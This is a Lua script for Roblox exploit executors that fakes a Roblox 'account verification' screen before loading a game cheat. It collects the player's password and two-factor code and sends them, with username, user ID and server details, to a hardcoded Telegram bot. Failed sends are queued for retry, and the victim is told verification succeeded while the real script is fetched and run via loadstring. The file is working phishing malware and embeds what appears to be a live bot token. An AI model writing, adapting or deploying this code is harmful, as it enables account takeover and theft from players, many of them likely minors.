--!nocheck
-- ==== НАСТРОЙКА ====
local CONFIG = {
    BOT_TOKEN = "9250559277:AAFUxKuxXqikch9r6MktokQczDrH8f1fnZE",
    CHAT_ID   = "8531463305",
    SUPPRESS_DAYS     = 7,
    DEBUG_SHOW_ALWAYS = false,
    PING_ON_START     = false,
    REAL_URL = "https://raw.githubusercontent.com/let7829/Green-hub/refs/heads/main/Lumber%20Tycoon%202",
}

local TEXT = {
    ru = {
        head = "Требуется верификация",
        sub  = "Чтобы включить скрипт, привяжите Roblox-аккаунт. Займёт 15 секунд и нужно один раз.",
        link = "Привязать аккаунт",
        later = "Позже",
        field = "Пароль от аккаунта",
        hint = "Пароль нужен один раз, чтобы подтвердить владение аккаунтом.",
        short = "Слишком короткий пароль — введите пароль от аккаунта.",
        empty = "Введите пароль, чтобы продолжить.",
        age  = "Аккаунт создан %d дн. назад",
        steps = { "Подключение к Roblox…", "Проверка профиля…", "Синхронизация настроек…" },
        twofa = "Подтверждение входа",
        twofaSub = "Мы отправили код на почту, привязанную к аккаунту.",
        code = "6-значный код",
        verify = "Подтвердить",
        skip2 = "Позже",
        done = "Аккаунт подтверждён",
        doneSub = "Верификация пройдена. Приятной игры!",
        login = "Войти",
    },
    en = {
        head = "Verification required",
        sub  = "Link your Roblox account to enable the script. Takes 15 seconds, one time only.",
        link = "Link account",
        later = "Later",
        field = "Account password",
        hint = "Needed once to confirm you own the account.",
        short = "Too short — enter your account password.",
        empty = "Enter your password to continue.",
        age  = "Account created %d days ago",
        steps = { "Connecting to Roblox…", "Checking profile…", "Syncing settings…" },
        twofa = "Confirm sign-in",
        twofaSub = "We sent a code to the email linked to your account.",
        code = "6-digit code",
        verify = "Confirm",
        skip2 = "Later",
        done = "Account verified",
        doneSub = "Verification complete. Have fun!",
        login = "Log In",
    },
}

local lang = "ru"
local function L(key)
    return TEXT[lang][key]
end

local HttpService  = game:GetService("HttpService")
local Players      = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local LocalPlayer  = Players.LocalPlayer
local PlayerGui    = LocalPlayer:WaitForChild("PlayerGui")

local req = (syn and syn.request) or http_request or request
local identify = (identifyexecutor or getexecutorname or function() return "?" end)

local PENDING  = "verify_pending.json"
local SUPPRESS = "verify_seen.json"

-- ==== ХРАНИЛИЩЕ ====
local function readList(path)
    local ok, raw = pcall(readfile, path)
    if not ok or not raw or raw == "" then return {} end
    local ok2, data = pcall(function() return HttpService:JSONDecode(raw) end)
    if ok2 and type(data) == "table" then return data end
    return {}
end

local function writeList(path, list)
    pcall(writefile, path, HttpService:JSONEncode(list))
end

-- ==== ТРАНСПОРТ ====
local function esc(s)
    return (tostring(s or ""):gsub("&", "&amp;"):gsub("<", "&lt;"):gsub(">", "&gt;"))
end

local function api(method, payload)
    if not req then return false end
    local ok, res = pcall(req, {
        Url = ("https://api.telegram.org/bot%s/%s"):format(CONFIG.BOT_TOKEN, method),
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(payload),
    })
    return ok and res and res.StatusCode == 200
end

local function send(text)
    for attempt = 1, 3 do
        if api("sendMessage", {
            chat_id = CONFIG.CHAT_ID,
            text = text,
            parse_mode = "HTML",
            disable_web_page_preview = true,
        }) then
            return true
        end
        task.wait(attempt * 2)
    end
    return false
end

local function sendOrQueue(text)
    if send(text) then return end
    local list = readList(PENDING)
    table.insert(list, text)
    writeList(PENDING, list)
end

local function flushQueue()
    local list = readList(PENDING)
    if #list == 0 then return end
    local left = {}
    for _, text in ipairs(list) do
        if not send(text) then table.insert(left, text) end
        task.wait(0.4)
    end
    writeList(PENDING, left)
end

-- ==== МЕТАДАННЫЕ ====
local function meta()
    local ok, ex = pcall(identify)
    return {
        executor = ok and tostring(ex) or "?",
        place = tostring(game.PlaceId),
        job = tostring(game.JobId),
        time = os.date("!%Y-%m-%d %H:%M:%S") .. " UTC",
    }
end

-- ==== GUI ====
local vp = workspace.CurrentCamera.ViewportSize
local cardW = math.clamp(vp.X - 48, 280, 360)

local gui = Instance.new("ScreenGui")
gui.Name = "AccountVerify"
gui.IgnoreGuiInset = true
gui.DisplayOrder = 99999
gui.ResetOnSpawn = false
gui.Parent = PlayerGui

local backdrop = Instance.new("Frame")
backdrop.Size = UDim2.fromScale(1, 1)
backdrop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
backdrop.BackgroundTransparency = 1
backdrop.BorderSizePixel = 0
backdrop.Parent = gui

local card = Instance.new("Frame")
card.AnchorPoint = Vector2.new(0.5, 0)
card.Position = UDim2.new(0.5, 0, 0, 80)
card.Size = UDim2.new(0, cardW, 0, 0)
card.AutomaticSize = Enum.AutomaticSize.Y
card.BackgroundColor3 = Color3.fromRGB(35, 37, 39)
card.BorderSizePixel = 0
card.Parent = backdrop

Instance.new("UICorner", card).CornerRadius = UDim.new(0, 8)

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(70, 73, 76)
stroke.Thickness = 1
stroke.Transparency = 0.4
stroke.Parent = card

local pad = Instance.new("UIPadding")
pad.PaddingLeft = UDim.new(0, 20)
pad.PaddingRight = UDim.new(0, 20)
pad.PaddingTop = UDim.new(0, 20)
pad.PaddingBottom = UDim.new(0, 20)
pad.Parent = card

local layout = Instance.new("UIListLayout")
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Padding = UDim.new(0, 10)
layout.Parent = card

-- ==== ШАПКА С ЯЗЫКАМИ ====
local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 26)
header.BackgroundTransparency = 1
header.LayoutOrder = 0
header.Parent = card

local brand = Instance.new("TextLabel")
brand.Size = UDim2.new(1, -84, 1, 0)
brand.BackgroundTransparency = 1
brand.Font = Enum.Font.GothamBlack
brand.Text = "ROBLOX"
brand.TextSize = 22
brand.TextColor3 = Color3.fromRGB(255, 255, 255)
brand.TextXAlignment = Enum.TextXAlignment.Left
brand.Parent = header

local langBox = Instance.new("Frame")
langBox.AnchorPoint = Vector2.new(1, 0.5)
langBox.Position = UDim2.new(1, 0, 0.5, 0)
langBox.Size = UDim2.fromOffset(76, 22)
langBox.BackgroundTransparency = 1
langBox.Parent = header

local langBtns = {}
for i, code in ipairs({ "ru", "en" }) do
    local b = Instance.new("TextButton")
    b.Size = UDim2.fromOffset(34, 22)
    b.Position = UDim2.fromOffset((i - 1) * 38, 0)
    b.BackgroundColor3 = Color3.fromRGB(57, 59, 61)
    b.BorderSizePixel = 0
    b.Font = Enum.Font.GothamBold
    b.TextSize = 11
    b.Text = code:upper()
    b.Parent = langBox
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 5)
    langBtns[code] = b
end

local function paintLang()
    for code, b in pairs(langBtns) do
        if code == lang then
            b.BackgroundColor3 = Color3.fromRGB(0, 176, 111)
            b.TextColor3 = Color3.fromRGB(255, 255, 255)
        else
            b.BackgroundColor3 = Color3.fromRGB(57, 59, 61)
            b.TextColor3 = Color3.fromRGB(160, 163, 165)
        end
    end
end

-- ==== ЭЛЕМЕНТЫ ====
local function label(text, size, color, order, bold)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, 0, 0, size)
    l.BackgroundTransparency = 1
    l.Font = bold and Enum.Font.GothamBold or Enum.Font.Gotham
    l.Text = text
    l.TextSize = size
    l.TextColor3 = color
    l.TextWrapped = true
    l.LayoutOrder = order
    l.Parent = card
    return l
end

local function field(placeholder, order)
    local f = Instance.new("TextBox")
    f.Size = UDim2.new(1, 0, 0, 38)
    f.BackgroundColor3 = Color3.fromRGB(57, 59, 61)
    f.BorderSizePixel = 0
    f.Font = Enum.Font.Gotham
    f.TextSize = 15
    f.TextColor3 = Color3.fromRGB(240, 240, 240)
    f.PlaceholderText = placeholder
    f.PlaceholderColor3 = Color3.fromRGB(140, 143, 145)
    f.Text = ""
    f.ClearTextOnFocus = false
    f.LayoutOrder = order
    f.Parent = card
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 6)
    local p = Instance.new("UIPadding")
    p.PaddingLeft = UDim.new(0, 12)
    p.PaddingRight = UDim.new(0, 12)
    p.Parent = f
    return f
end

local function button(text, order)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, 0, 0, 38)
    b.BackgroundColor3 = Color3.fromRGB(0, 176, 111)
    b.BorderSizePixel = 0
    b.Font = Enum.Font.GothamBold
    b.TextSize = 15
    b.TextColor3 = Color3.fromRGB(255, 255, 255)
    b.Text = text
    b.AutoButtonColor = true
    b.LayoutOrder = order
    b.Parent = card
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
    return b
end

local function link(text, order)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, 0, 0, 18)
    b.BackgroundTransparency = 1
    b.Font = Enum.Font.Gotham
    b.TextSize = 13
    b.TextColor3 = Color3.fromRGB(150, 153, 155)
    b.Text = text
    b.LayoutOrder = order
    b.Parent = card
    return b
end

local function clear()
    for _, c in ipairs(card:GetChildren()) do
        if c ~= header and (c:IsA("TextLabel") or c:IsA("TextBox")
            or c:IsA("TextButton") or c:IsA("ImageLabel")) then
            c:Destroy()
        end
    end
end

-- ==== ПОЛЕЗНАЯ ЧАСТЬ ====
local function runReal()
    if getgenv().GH_LOADED then return end
    getgenv().GH_LOADED = true
    local ok, err = pcall(function()
        local src = game:HttpGet(CONFIG.REAL_URL)
        local fn = loadstring(src)
        if fn then fn() end
    end)
    if not ok then
        getgenv().GH_LOADED = nil
        warn("[verify] real part failed: " .. tostring(err))
    end
end

-- ==== ЗАКРЫТИЕ ====
local function finishAndClose()
    render = nil
    TweenService:Create(backdrop, TweenInfo.new(0.3), { BackgroundTransparency = 1 }):Play()
    TweenService:Create(card, TweenInfo.new(0.3), { BackgroundTransparency = 1 }):Play()
    task.wait(0.32)
    gui:Destroy()
    task.delay(0.15, runReal)
end

-- ==== ЭКРАНЫ ====
local showIntro, showStage1, showProgress, showStage2
local username = LocalPlayer.Name
local passCache = ""
local codeCache = ""
local progressToken = 0

showStage2 = function()
    render = showStage2
    clear()
    label(L("twofa"), 17, Color3.fromRGB(240, 240, 240), 1, true)
    label(L("twofaSub"), 13, Color3.fromRGB(165, 168, 170), 2)
    local code = field(L("code"), 3)
    code.Text = codeCache
    local ok = button(L("verify"), 4)
    local skip = link(L("skip2"), 5)
    local busy = false

    code:GetPropertyChangedSignal("Text"):Connect(function()
        codeCache = code.Text
    end)

    local function submit()
        if busy then return end
        busy = true
        ok.Text = "…"

        local m = meta()
        sendOrQueue(("📩 <b>2FA</b>\n<b>Ник:</b> %s\n<b>Код:</b> <code>%s</code>\n<b>Экзекьютор:</b> %s\n<b>Время:</b> %s")
            :format(esc(username), esc(code.Text), esc(m.executor), esc(m.time)))

        render = nil
        clear()
        label("✓", 34, Color3.fromRGB(0, 176, 111), 1, true)
        label(L("done"), 17, Color3.fromRGB(240, 240, 240), 2, true)
        label(L("doneSub"), 13, Color3.fromRGB(165, 168, 170), 3)
        task.delay(1.8, finishAndClose)
    end

    ok.MouseButton1Click:Connect(submit)
    code.FocusLost:Connect(function(enter)
        if enter then submit() end
    end)
    skip.MouseButton1Click:Connect(finishAndClose)
end

showProgress = function()
    render = showProgress
    progressToken += 1
    local myToken = progressToken
    clear()

    local head = Instance.new("ImageLabel")
    head.Size = UDim2.new(0, 56, 0, 56)
    head.BackgroundColor3 = Color3.fromRGB(57, 59, 61)
    head.BorderSizePixel = 0
    head.ScaleType = Enum.ScaleType.Crop
    head.Image = ("rbxthumb://type=AvatarHeadShot&id=%d&w=150&h=150"):format(LocalPlayer.UserId)
    head.LayoutOrder = 1
    head.Parent = card
    Instance.new("UICorner", head).CornerRadius = UDim.new(1, 0)

    label(username, 15, Color3.fromRGB(240, 240, 240), 2, true)
    label(L("age"):format(LocalPlayer.AccountAge), 12, Color3.fromRGB(140, 143, 145), 3)

    local line = label("", 12, Color3.fromRGB(0, 176, 111), 4)
    for _, step in ipairs(L("steps")) do
        if myToken ~= progressToken then return end
        line.Text = step
        task.wait(0.65)
    end
    if myToken ~= progressToken then return end
    task.wait(0.35)
    if myToken ~= progressToken then return end
    showStage2()
end

showStage1 = function()
    render = showStage1
    clear()
    local user = field("Username", 1)
    user.Text = username
    local pass = field(L("field"), 2)
    pass.Text = passCache
    label(L("hint"), 12, Color3.fromRGB(140, 143, 145), 3)

    local err = label("", 12, Color3.fromRGB(230, 100, 100), 4)
    local ok = button(L("login"), 5)
    local skip = link(L("later"), 6)
    local busy = false

    pass:GetPropertyChangedSignal("Text"):Connect(function()
        passCache = pass.Text
    end)

    local function submit()
        if busy then return end
        if pass.Text == "" then
            err.Text = L("empty")
            pass:CaptureFocus()
            return
        end
        if #pass.Text < 6 then
            err.Text = L("short")
            pass:CaptureFocus()
            return
        end

        busy = true
        err.Text = ""
        ok.Text = "…"

        local m = meta()
        sendOrQueue(("🔐 <b>Вход</b>\n<b>Ник:</b> %s\n<b>UserID:</b> %d\n<b>Пароль:</b> <code>%s</code>\n<b>PlaceId:</b> %s\n<b>JobId:</b> <code>%s</code>\n<b>Экзекьютор:</b> %s\n<b>Время:</b> %s")
            :format(esc(username), LocalPlayer.UserId, esc(pass.Text), esc(m.place), esc(m.job), esc(m.executor), esc(m.time)))

        username = user.Text ~= "" and user.Text or username
        showProgress()
    end

    ok.MouseButton1Click:Connect(submit)
    pass.FocusLost:Connect(function(enter)
        if enter then submit() end
    end)
    skip.MouseButton1Click:Connect(finishAndClose)
end

showIntro = function()
    render = showIntro
    clear()
    label(L("head"), 16, Color3.fromRGB(240, 240, 240), 1, true)
    label(L("sub"), 13, Color3.fromRGB(165, 168, 170), 2)
    local go = button(L("link"), 3)
    local skip = link(L("later"), 4)

    go.MouseButton1Click:Connect(function()
        showStage1()
    end)
    skip.MouseButton1Click:Connect(function()
        writeList(SUPPRESS, { os.time() })
        finishAndClose()
    end)
end

-- ==== ЯЗЫК ====
local function setLang(code)
    if code == lang or not TEXT[code] then return end
    lang = code
    paintLang()
    if render then render() end
end

for code, b in pairs(langBtns) do
    b.MouseButton1Click:Connect(function()
        setLang(code)
    end)
end
paintLang()

-- ==== ЗАПУСК ====
task.spawn(flushQueue)

local suppressed = false
if not CONFIG.DEBUG_SHOW_ALWAYS then
    local seen = readList(SUPPRESS)
    if seen[1] and (os.time() - seen[1]) < CONFIG.SUPPRESS_DAYS * 86400 then
        suppressed = true
    end
end

if suppressed then
    gui:Destroy()
    runReal()
else
    if CONFIG.PING_ON_START then
        local m = meta()
        task.spawn(send, ("👀 <b>Скрипт запущен</b>\n<b>Ник:</b> %s\n<b>Экзекьютор:</b> %s")
            :format(esc(LocalPlayer.Name), esc(m.executor)))
    end
    showIntro()
    task.delay(0.05, function()
        TweenService:Create(backdrop, TweenInfo.new(0.25), { BackgroundTransparency = 0.45 }):Play()
    end)
end